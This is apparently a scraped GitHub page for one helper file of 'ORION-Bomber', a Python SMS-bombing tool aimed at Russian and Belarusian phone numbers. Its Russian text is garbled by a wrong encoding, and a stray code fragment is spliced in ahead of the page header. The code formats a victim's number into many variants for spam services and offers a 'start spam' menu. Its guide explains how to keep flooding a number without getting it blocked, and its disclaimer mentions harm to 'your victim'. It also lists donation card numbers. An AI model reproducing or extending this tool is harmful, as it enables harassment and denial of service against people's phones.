			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"), colored("Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð¸Ð· Ð¿Ð°Ð¿ÐºÐ¸", "green"), colored("tools", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
	except:
		print("")
		print(colored("ÐœÑ‹ Ð½Ðµ ÑÐ¼Ð¾Ð³Ð»Ð¸ Ð¿ÐµÑ€ÐµÐ¼ÐµÑÑ‚Ð¸Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð² Ð½ÑƒÐ¶Ð½ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ", "yellow"))
		print(colored("Ð’Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ñƒ Ð²Ð°Ñ Ð´Ð»Ñ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÐ° Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑŽ Ð½Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹ Ð¤Ð°Ð¹Ð»Ñ‹ Ð¸ Ð¼ÐµÐ´Ð¸Ð°ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚", "yellow"))
		print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ñ€Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÑƒ Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ð²ÑÐµ Ð½ÑƒÐ¶Ð½Ñ‹Ðµ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¸ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð¸Ñ‚Ðµ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÑƒ"))
		print(colored("Ð—Ð° Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾ Ð´Ð°Ð½Ð½Ð¾Ð¼Ñƒ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑƒ Ð¿Ð¸ÑˆÐ¸Ñ‚Ðµ Ð² Ð½Ð°ÑˆÐµÐ³Ð¾ Ð±Ð¾Ñ‚Ð° Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼"), colored("https://t.me/orion_feedback_bot", "cyan"))
		print("")
		print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
		input()

def clear_logs():
	a = open("tools/logs.txt", "w")
	a.close()
	a = open("tools/error_logs.txt", "w")
	a.close()
	print("")
	print(colored("Ð›Ð¾Ð³Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð±Ñ‹Ð»Ð¸ Ð¾Ñ‡Ð¸Ñ‰ÐµÐ½Ñ‹", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def banner_info():
	print(colored("\nÐ¢ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "cyan"))
	print("â”œ"+colored("Lucky", "green")+":", colored("https://t.me/Lucky1376", "cyan"))
	print("â”œ"+colored("LostIk", "red")+":", colored("https://t.me/LostIk31", "cyan"))
	print("â””"+colored("ÐšÐ°Ð½Ð°Ð»", "cyan")+":", colored("https://t.me/orion_bomber", "cyan"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def number_ckeck(numb):
	if len(numb) == 9 or len(numb) == 10:
		sp_numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
		for i in str(numb):
			try:
				int(i)
			except:
				return False
		return True
	else:
		return False

Sign up
Lucky1376
/
ORION-Bomber
Public
Code
Issues
1
Pull requests
1
Actions
Projects
Security
Insights
ORION-Bomber/tools/tools.py
@Lucky1376
Lucky1376 ðŸŽ„Happy New Year! 1.3.0
â€¦
 4 contributors
978 lines (903 sloc)  41.6 KB
# -*- coding: utf-8 -*-

# Tools for different processing

from termcolor import colored
from datetime import datetime
import requests as r, os, time, random, shutil, zipfile, webbrowser
from sys import platform
from tools import proxy
from progress.bar import ChargingBar
from tools import sender as send

def FormattingNumber(number, country):
	numb = str(number)
	if country == "ru": # For Russia
		if numb[0:1] == "+" and numb[1:2] == "7": # +71234567890
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = "8"+numb[2:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "7":  # 71234567890
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = "8"+numb[1:]
			numb = "+"+numb
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "8":  # 81234567890
			numb_1 = "+7"+numb[1:]
			numb_2 = "7"+numb[1:]
			numb_3 = numb
			numb = "+7"+numb[1:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
	elif country == "by": # For Belarus
		if numb[0:1] == "+": # +123456789012
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = numb[4:]
			numb_4 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] + '-' + numb[9:11] + '-' + numb[11:13]
			numb_5 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] +numb[9:11] +numb[11:13]
		elif numb[0:1] == "3" or numb[0:3] == "375": # 123456789012
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = numb[3:]
			numb_4 = '+' + numb[:3] + ' (' + numb[3:5] + ") " + numb[5:8] + '-' + numb[8:10] + '-' + numb[10:12]
			numb_5 = numb_1[:4] + ' (' + numb_1[4:6] + ") " + numb_1[6:9] +numb_1[9:11] +numb_1[11:13]
	if country == "by":
		return numb_1, numb_2, numb_3, numb_4, numb_5
	elif country == "ru":
		return numb_1, numb_2, numb_3, numb_4, numb_5, numb_6, numb_7, numb_8, numb_9, numb_10

def clear():
	if platform == "linux" or platform == "linux2" or platform == "darwin":
		os.system("clear")
	elif platform == "win32":
		os.system("cls")
	else:
		print(colored("\nÐ˜Ð·Ð²Ð¸Ð½Ð¸Ñ‚Ðµ Ð½Ð°ÑˆÐ° Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ Ð²Ð°ÑˆÑƒ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½ÑƒÑŽ ÑÐ¸ÑÑ‚ÐµÐ¼Ñƒ ;(\n", "red"))
		exit()

def anim_text(text, speed, color="green"):
	for i in text:
		print(colored(i, color), end="", flush=True)
		time.sleep(speed)

def RCT(text):
	colors = ["green", "yellow", "red", "magenta", "blue"]
	new_text = ""
	for i in str(text):
		new_text += colored(i, random.choice(colors))
	return new_text

def banner():
	a = open("tools/version.txt", "r")
	ver = a.read().split("\n")[0]
	a.close()

	ru_s = str(len(send.services_list))
	by_s = str(len(send.services_list_by))

	banner = colored("""
	   â†   â†       â†        â†     â†   â†   â†
	â†		    â†        â†       â†     â†
	 â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„  â† â–ˆ 
	â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
	â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
	â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
	â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
	â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘â–“  â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘ â† â–’ â–’ 
	  â–‘ â–’ â–’â–‘   â–‘â–’ â–‘ â–’â–‘ â–’ â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
	â–‘ â–‘ â–‘ â–’ â†  â–‘â–‘   â–‘  â–’ â–‘â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
	    â–‘ â–‘     â–‘  â†   â–‘     â†â–‘ â–‘  â†    â†   â–‘ 
	 â†  	â†          â†        â†""", "blue")

	new_year = " "*21+RCT("Happy New Year!")
	pred_info = "\n"+" "*24+colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹", "green")+"\n"
	pred_info_ru = " "*17+colored("Ð Ð¾ÑÑÐ¸Ñ ", "blue")+colored(ru_s, "green")+"   "
	pred_info_by = colored("Ð‘ÐµÐ»Ð°Ñ€ÑƒÑÑŒ ", "cyan")+colored(by_s, "green")+"\n"
	pred_info = pred_info+pred_info_ru+pred_info_by

	info = " "*13+colored("[", "blue")+"Developers :"+colored("Lucky", "green")+" and "+colored("LostIk", "red")
	info_2 = " "*13+colored("[", "blue")+"Version    :"+colored(ver, "red")+"ðŸŽ„"
	info_3 = " "*13+colored("[", "blue")+"Telegram   :"+colored("@orion_bomber", "cyan")+colored("   <--", "green")+"\n"

	print(banner)
	print(new_year)
	print(pred_info)
	print(info)
	print(info_2)
	print(info_3)

def banner_tools():
	print(colored("[1]", "red"), colored("ÐÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÐ¿Ð°Ð¼", "green"))
	#print(colored("[2]", "red"), colored("FAQ ÐŸÑ€Ð¾ Ð¿Ñ€Ð¾ÐºÑÐ¸", "blue"))
	#print(colored("[3]", "red"), colored("ÐšÑ€Ð°Ñ‚ÐºÐ¾Ðµ Ñ€ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼", "cyan"))
	#print(colored("[4]", "red"), colored("ÐžÑ‚ÐºÐ°Ð· Ð¾Ñ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸", "red"))
	print(colored("[2]", "red"), colored("ÐŸÐ¾Ð´Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ñ€Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¾Ð²!    <---", "green"))
	print(colored("[3]", "red"), colored("Ð˜Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ Ð¿Ð¾ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐµ Ð»Ð¾Ð³Ð¾Ð²", "yellow"))
	print(colored("\n[99]", "red"), colored("Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ", "cyan"))
	print(colored("\n[0] Ð’Ñ‹Ñ…Ð¾Ð´", "red"))

def quick_guide():
	print("")
	print(colored("Ð’ Ð½Ð°ÑˆÐµÐ¼ Ð±Ð¾Ð¼Ð±ÐµÑ€Ðµ ÑÐ¿Ð°Ð¼ Ð¼Ð¾Ð¶ÐµÑ‚ Ð¿Ð¾ÑÑ‚ÐµÐ¿ÐµÐ½Ð½Ð¾ ÑƒÑ…ÑƒÐ´ÑˆÐ°Ñ‚ÑŒÑÑ Ð¸Ð·-Ð·Ð° Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚ÑƒÐ¿Ð°ÐµÑ‚ Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÑƒ ÑÐ¼Ñ.", "green"))
	print(colored("ÐÐµ Ð¿Ñ‹Ñ‚Ð°Ð¹Ñ‚ÐµÑÑŒ Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ð½Ð° Ð²ÑÑŽ Ð½Ð¾Ñ‡ÑŒ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€, Ð²Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð¸Ñ‚Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð½Ð¾Ð¼ÐµÑ€ Ñƒ ÑÐµÐ±Ñ Ð² Ð±Ð°Ð·Ðµ Ð¸ Ð½Ð¸ÐºÐ°ÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð½Ðµ Ð¿Ð¾Ð¼Ð¾Ð³ÑƒÑ‚.", "green"))
	print(colored("Ð”Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾ 2-3 ÐºÑ€ÑƒÐ³Ð° Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€ Ñ€Ð°Ð· Ð² ÑÑƒÑ‚ÐºÐ¸ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð´Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ Ð½Ðµ Ð¼Ð°Ð»Ð¾Ðµ ÐºÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€.", "green"))
	print(colored("ÐÐµ Ð±ÑƒÐ´ÑŒÑ‚Ðµ Ð¶Ð°Ð´Ð½Ñ‹ Ð¸ ÑÐ»Ð¸ÑˆÐºÐ¾Ð¼ Ð¼ÑÑ‚Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹, Ñ‚Ð¾Ð³Ð´Ð° Ð²Ñ‹ ÑÐ¼Ð¾Ð¶ÐµÑ‚Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾.", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def disclaimer():
	print("")
	print(colored("Ð Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ ORION Ð½Ðµ Ð½ÐµÑÑƒÑ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð° Ð´Ð¾ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¼Ð¾Ñ€Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð»Ð¸ Ñ„Ð¸Ð·Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ ÑƒÑ‰ÐµÑ€Ð± Ð²Ð°ÑˆÐµÐ¹ Ð¶ÐµÑ€Ñ‚Ð²Ðµ.", "green"))
	print(colored("ÐŸÐ¾Ð»ÑŒÐ·ÑƒÑÑÑŒ Ð´Ð°Ð½Ð½Ð¾Ð¹ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð¾Ð¹ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ ÑÐ¾Ð³Ð»Ð°ÑˆÐ°ÐµÑ‚ÐµÑÑŒ Ð½Ð° ÑÑ‚Ð¾ Ð¸ Ð±ÐµÑ€ÐµÑ‚Ðµ Ð²ÑÑŽ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð½Ð° ÑÐµÐ±Ñ", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def donate():
	print("")
	print(colored("Ð’Ð°ÑˆÐ° Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð° ÐµÑ‰Ðµ Ð±Ð¾Ð»ÑŒÑˆÐµ Ð¼Ð¾Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ Ð½Ð°Ñ Ð²Ñ‹Ð¿ÑƒÑÐºÐ°Ñ‚ÑŒ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ!", "green"))
	print("")
	print(colored("QIWI", "yellow"))
	print("â”œ"+colored("https://qiwi.com/n/LUCKY1376", "cyan"), colored("ÐŸÐµÑ€ÐµÐ²Ð¾Ð´ Ð¿Ð¾ Ð½Ð¸ÐºÐ½ÐµÐ¹Ð¼Ñƒ", "green"))
	print("â”œ"+colored("2200 7302 4344 6206", "cyan"), colored("MIR", "green"))
	print("â””"+colored("4890 4947 5754 5546", "cyan"), colored("VISA", "blue"))
	print("")
	print(colored("Ð¡Ð±ÐµÑ€Ð±Ð°Ð½Ðº", "green"))
	print("â”œ"+colored("2202 2024 3331 7181", "cyan"), colored("MIR", "green"))
	print("â””"+colored("5469 4500 1265 2996", "cyan"), colored("MasterCard", "red"))
	print("")
	print(colored("Ð®Ð¼Ð°Ð½Ð¸", "blue"))
	print("â”œ"+colored("4100 1174 8743 5875", "cyan"), "ÐÐ¾Ð¼ÐµÑ€ ÑÑ‡ÐµÑ‚Ð°")
	print("â””"+colored("2202 1201 0852 7850", "cyan"), colored("MIR", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def faq_proxy():
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚Ð°ÐºÐ¾Ð¹ Ð¼ÐµÐ´Ð»ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ¿Ð°Ð¼ Ð¸ Ñ‚Ð°ÐºÐ°Ñ Ñ‡Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°?", "cyan"))
	print(colored("ÐÐ°Ñˆ Ð¿Ð°Ñ€ÑÐµÑ€ Ð±ÐµÑ€ÐµÑ‚ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ð¾Ð±Ñ‰ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð², ÐºÐ¾Ð½ÐµÑ‡Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ñ‚Ð°Ðº Ð´ÐµÐ»Ð°ÐµÐ¼ Ð¸ ÑÐ¾Ð¾Ñ‚Ð²ÐµÑÑ‚Ð²ÐµÐ½Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ÑÑ ÑÑ‚Ð¸Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸.", "green"))
	print(colored("Ð¢Ð°ÐºÐ¶Ðµ Ð½Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ°Ñ… Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð°Ð»Ð¾ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ñ… Ð¸ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ñ‹Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐ»Ð¾ Ð±Ñ‹ ÑƒÐ»ÑƒÑ‡ÑˆÐ¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ñ Ð½Ð¸Ð¼Ð¸.", "green"))
	print(colored("Ð§Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð½Ð¸ÐºÐ°ÐµÑ‚ Ð¸Ð·-Ð·Ð° Ð½Ðµ ÑÑ‚Ð°Ð±Ð¸Ð»ÑŒÐ½Ð¾ÑÑ‚Ð¸ ÑÑ‚Ð¸Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸, Ñ‡Ð°ÑÑ‚Ð¾ Ð¾Ð½Ð¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿ÐµÑ€ÐµÑÑ‚Ð°ÑŽÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð±ÐµÑ€ÐµÑ‚ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð±Ñ€Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð»ÑŽÐ±Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð° Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð¾Ð¼ÐµÑ€Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð²ÐµÐ»Ð¸?", "cyan"))
	print(colored("ÐÐµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð¿ÑƒÑÑ‚Ð¸Ð¼ ÐºÐ°Ð½Ð°Ð´ÑÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ñ€Ð¾ÑÑÐ¸Ð¹ÑÐºÐ¸Ð¼Ð¸ ÑÐµÑ€Ð²Ð¸ÑÐ°Ð¼Ð¸ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ .ru", "green"))
	print(colored("Ð•ÑÐ»Ð¸ Ð½Ð° ÑÐ°Ð¹Ñ‚Ðµ ÑƒÐºÐ°Ð·Ð°Ð½ Ð´Ð¾Ð¼ÐµÐ½ Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ñ‚Ð¾ Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð±Ñ‹Ñ‚ÑŒ ÑÑ‚Ð¾Ð¹ Ð¶Ðµ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print(colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿ÑƒÑÑ‚ÑÑ‚ Ð½Ð°Ñˆ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¸Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐµ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð´Ð»Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸?", "cyan"))
